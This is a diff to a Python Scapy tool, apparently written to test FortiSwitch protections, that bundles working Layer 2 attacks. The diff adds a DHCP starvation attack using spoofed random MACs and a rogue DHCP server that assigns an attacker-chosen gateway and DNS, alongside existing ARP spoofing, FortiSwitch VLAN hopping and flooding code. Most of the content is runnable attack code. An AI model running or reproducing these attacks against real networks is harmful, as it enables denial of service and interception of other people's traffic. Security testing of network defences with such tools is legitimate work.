@@ -1,12 +1,21 @@
 #!/usr/bin/python3
 
-# Requirements: Scapy for Python3 - apt-get install python3-scapy
-# 		tcpreplay - apt-get install tcpreplay
+# Name:          FortiSwitch L2 Attack techniques
+# Description:   Various well known Layer 2 attack techniques in one tool, written to test and demonstrate the FortiSwitch protection features.
+#                Only the VLAN Hopping attack in this module is FortiSwitch specific. All other tools are vendor neutral.
+#
+# Author:        Sander Zegers
+#
+# Requirements:  Scapy for Python3 - apt-get install python3-scapy
+# 		 tcpreplay - apt-get install tcpreplay
 
 import argparse
 import os
 import threading
 import time
+import random
+import ipaddress
+
 from scapy.all import *
 from scapy.contrib.lldp import *
 from scapy.contrib.lacp import *
@@ -22,6 +31,13 @@ vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')
 
 arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')
 
+dhcpexhaustion_parser = subparsers.add_parser('dhcpexhaustion',help='DHCP exhaustion attack')
+
+dhcpserver_parser = subparsers.add_parser('dhcpserver',help='DHCP Server')
+
+dhcpreleaser_parser = subparsers.add_parser('dhcpreleaser',help='DHCP Releaser')
+
+
 main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
 main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")
 
@@ -34,6 +50,14 @@ arpspoof_parser.add_argument("-t","--target",help="IP address of the target devi
 arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
 arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)
 
+dhcpexhaustion_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
+dhcpexhaustion_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")
+
+dhcpserver_parser.add_argument("-s","--scope",help="IP Range of provided IPs by the DHCP Server. Format: 192.168.100.20-192.168.100.50",required=True)
+dhcpserver_parser.add_argument("-sn","--subnetmask",help="Subnetmask for the provided IPs",required=True)
+dhcpserver_parser.add_argument("-g","--gateway",help="Provided the Gateway IP. By default this host will be the gateway",required=True)
+dhcpserver_parser.add_argument("-d","--dns",help="Provided single IP address for DNS Server",default="8.8.8.8")
+dhcpserver_parser.add_argument("-c","--checkfree",help="Check if offered IP is free",default=False,type=bool)
 
 #vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
 #vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
@@ -48,23 +72,206 @@ action = main_args.action
 if main_args.interface:
    conf.iface=main_args.interface
 
-isl_link_flags = {
-   "auto-isl":0,
-   "auto-mclag-icl":1,
-   "mclag-switch":2,
-   "?":3,
-   "isl-fortilink":4,
-}
-
-
 event_LACP_Established = threading.Event()
 
+# DHCP Leases for DHCP Server
+dhcp_leases = {}
+dhcp_leases["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "expiry": 5000, "transaction_id":0x123123}
+
+# DHCP Offers for DHCP exhaustion
+dhcp_offers = {}
+dhcp_offers["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "transaction_id":0x123123}
 
 
-# level 0 = standard output, level 1 = info, level 2 = debug
+def main():
+
+   if os.geteuid() != 0:
+      print("--- Script not started as root user, possible permissions problem ---")
+
+   if action=="flood":
+      l2_flood(floodtype=main_args.floodtype)
+
+   elif action=="vlanhop":
+      vlanhop()
+
+   elif action=="arpspoof":
+      arpspoof()
+
+   elif action=="dhcpexhaustion":
+      dhcpexhaustion()
+
+   elif action=="dhcpserver":
+      dhcpserver()
+
+   if not action:
+      main_parser.print_help()
+
+
+# debug print: level 0 = standard output, level 1 = info, level 2 = debug
 def dprint(*args,level=0):
    if level <= main_args.verbose:
       print(' '.join(map(str, args)))
+
+def unicast_randMAC():
+   mac = RandMAC()
+   mac_list = mac.split(":")
+   first_byte = int(mac_list[0], 16) & 0xFE  # Clear the least significant bit
+   mac_list[0] = "{:02x}".format(first_byte)
+   return ":".join(mac_list)
+
+def mac_to_bin(mac_address):
+    return bytes(int(b, 16) for b in mac_address.split(':'))
+
+
+# Allocate free ip address for DHCP Server. Optionally check with ARP if IP is free.
+def allocate_ip(mac):
+   global dhcp_leases
+
+   start_ip,end_ip = main_args.scope.split('-')
+
+   start_ip= ipaddress.IPv4Address(start_ip)
+   end_ip = ipaddress.IPv4Address(end_ip)
+
+   found_free_ip = False
+
+   while start_ip<=end_ip and not found_free_ip:
+      for entry in dhcp_leases.values():
+           if entry.get('ip') != start_ip:
+               if main_args.checkfree:
+                  print("implement check free")
+               else:
+                  print(start_ip,"is free")
+                  dhcp_leases[mac]['ip']=str(start_ip)
+                  dhcp_leases[mac]['expiry'] = 5000
+                  found_free_ip = True
+                  break
+      start_ip += 1
+
+
+# Helper function to find the DHCP message type in the options
+def get_dhcp_message_type(dhcp_options):
+    for option in dhcp_options:
+        if option[0] == 'message-type':
+            return option[1]
+    return None
+
+def handle_dhcp_packet(packet,transaction_id):
+    global dhcp_leases
+    global dhcp_offers
+ 
+    if DHCP in packet:
+        message_type = get_dhcp_message_type(packet[DHCP].options)
+
+        if message_type == 2:  # DHCP Offer
+           for entry in dhcp_offers.values():
+              if entry.get('transaction_id') == packet[BOOTP].xid:
+                  dhcp_offers[packet[Ether].dst]['ip'] = packet[BOOTP].yiaddr
+                  send_dhcp_request(packet[Ether].dst)
+        elif message_type == 5:  # DHCP ACK
+            pass
+        elif message_type == 1:  # DHCP Discover
+            dhcp_leases[str(packet[Ether].src)] = {"transaction_id":packet[BOOTP].xid}
+            allocate_ip(packet[Ether].src)
+            send_dhcp_offer(packet[Ether].src)
+        elif message_type == 3:  # DHCP Request
+            for entry in dhcp_leases.values():
+               if entry.get('transaction_id') == packet[BOOTP].xid:
+                  send_dhcp_ack(packet[Ether].src)
+
+# Send DHCP Acknowledge packet, if DHCP Request is meant for this DHCP Server
+def send_dhcp_ack(mac):
+    global dhcp_leases
+    dhcp_lease = dhcp_leases[mac]
+    print("Answering DHCP Request")
+    dhcp_ack = (
+        Ether(dst=mac) /
+        IP(dst=dhcp_lease["ip"]) /
+        UDP(sport=67, dport=68) /
+        BOOTP(op=2,chaddr=mac_to_bin(mac),xid=dhcp_lease["transaction_id"],yiaddr=dhcp_lease["ip"]) /
+        DHCP(options=[("message-type", "ack"), ("lease_time",3600), ("subnet_mask","255.255.255.0"),("router",main_args.gateway),("name_server",main_args.dns), "end"])
+    )
+    sendp(dhcp_ack,verbose=False)
+
+
+# Send DHCP Offer to a DHCP Discover. Add entry to DHCP_Lease database
+def send_dhcp_offer(mac):
+    global dhcp_leases
+    dhcp_lease = dhcp_leases[mac]
+    dprint(dhcp_lease,level=2)
+    dhcp_offer = (
+        Ether(dst=mac) /
+        IP(dst=dhcp_lease['ip']) /
+        UDP(sport=67, dport=68) /
+        BOOTP(op=2,chaddr=mac_to_bin(mac),xid=dhcp_lease["transaction_id"],yiaddr=dhcp_lease["ip"]) /
+        DHCP(options=[("message-type", "offer"), ("lease_time",3600), ("subnet_mask","255.255.255.0"), "end"])
+        )
+    sendp(dhcp_offer,verbose=False)
+
+
+# Send DHCP Discover message for exhaustion attack
+def send_dhcp_discover(mac):
+    global dhcp_offers
+    dhcp_offer = dhcp_offers[mac]
+    dhcp_discover = (
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
+        DHCP(options=[("message-type", "discover"), "end"])
+    )
+    sendp(dhcp_discover,verbose=False)
+
+# Request ip for a offered IP address from remote DHCP Server
+def send_dhcp_request(mac):
+    global dhcp_offers
+    dhcp_offer = dhcp_offers[mac]
+    dprint("MAC:",mac,level=2)
+    dprint("Transaction_ID:",dhcp_offer['transaction_id'],level=2)
+    dhcp_request = (
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
+        DHCP(options=[("message-type", "request"),
+                      ("requested_addr", dhcp_offer['ip']),
+                      "end"])
+    )
+    print("Requesting",dhcp_offer['ip'],"...")
+    sendp(dhcp_request,verbose=False)
+
+# Run a dhcp exhaustion attack, by retrieve all available IP addresses and using a random MAC address
+def dhcpexhaustion():
+    global dhcp_offers
+
+    print("Launching DHCP Server exhaustion attack")
+    for i in range(main_args.count):
+       transaction_id = random.randint(0,0xFFFFFFFF)
+       src_mac = unicast_randMAC()
+       dhcp_offers[src_mac]= {'transaction_id':transaction_id}
+       send_dhcp_discover(src_mac)
+       sniff(prn=lambda packet:handle_dhcp_packet(packet,transaction_id), filter="udp and port 68", count=1, timeout=10)
+
+
+# Run a DHCP Server and offer IPs to clients according to the application arguments
+def dhcpserver():
+   print("Launching DHCP Server")
+   print(main_args.scope)
+   start_ip,end_ip = main_args.scope.split('-')
+   start_ip= ipaddress.IPv4Address(start_ip)
+   end_ip = ipaddress.IPv4Address(end_ip)
+   print("Start IP:",start_ip)
+   print("End IP:",end_ip)
+
+   subnetmask=main_args.subnetmask
+
+   gateway = ipaddress.IPv4Address(main_args.gateway)
+
+   dns = ipaddress.IPv4Address(main_args.dns)
+
+   print("Listening for Discover packages")
+
+   while(True):
+      sniff(prn=lambda packet:handle_dhcp_packet(packet,""), filter="udp and port 68", timeout=100)
 
 
 def fortilink_isl(lldp_keep_alive):
@@ -85,7 +292,7 @@ def fortilink_isl(lldp_keep_alive):
     sendp(lacp_response,verbose=0)
 
     packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
-    
+
     # Set Partner Settings
     lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
     lacp_response[LACP].partner_system = packet[0][LACP].actor_system
@@ -107,6 +314,7 @@ def fortilink_isl(lldp_keep_alive):
        sendp(lldp_keep_alive,verbose=0)
        time.sleep(1)
 
+# Run a ARP Spoof attack
 def arpspoof():
    print("Launching arpspoof attack")
    print("Retrieve MAC for target (",main_args.target,"): ",sep="",end="",flush=True)
@@ -134,10 +342,10 @@ def arpspoof():
       #packet to target
       sendp(Ether(dst=targetMAC)/ARP(op="is-at",psrc=main_args.impersonate,pdst=main_args.target,hwdst=targetMAC),count=1,verbose=False)
       #packet to impersonated host
-      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)      
+      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)
       time.sleep(main_args.frequency)
 
-
+# Run the VLAN Hop attack against FortiSwitch
 def vlanhop(iface=main_args.interface):
     print("Launching vlanhop attack")
     print("Listening for LLDP packets...",end="",flush=True)
@@ -232,12 +440,14 @@ def vlanhop(iface=main_args.interface):
                  print(single_packet[Dot1Q].vlan)
 
 
+# Run L2 Flood attack
 def l2_flood(floodtype,iface=main_args.interface):
     print("Launching flood attack:",floodtype)
     ttl=10
     if floodtype == "unknown_multicast":
        print("Generating",main_args.packetcount,"multicast flood packets")
        base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
+       dstip = main_args.destinationip
        if main_args.destinationip=="0.0.0.0":
           dstip = "224.0.0.0"
        dst_mac = "11:22:33:44:55:66"
@@ -259,8 +469,6 @@ def l2_flood(floodtype,iface=main_args.interface):
        if main_args.destinationmac == "00:01:02:03:04:05":
           dst_mac = "FF:FF:FF:FF:FF:FF"
 
-
-
     # generate packets in memory
     packet_list = []
 
@@ -274,18 +482,5 @@ def l2_flood(floodtype,iface=main_args.interface):
     print("Done")
 
 
-
-
-# Program start
-
-if os.geteuid() != 0:
-  print("--- Script not started as root user, possible permissions problem ---")
-
-if action=="flood":
-   l2_flood(floodtype=main_args.floodtype)
-
-if action=="vlanhop":
-   vlanhop()
-
-if action=="arpspoof":
-   arpspoof()
+# Program main
+main()
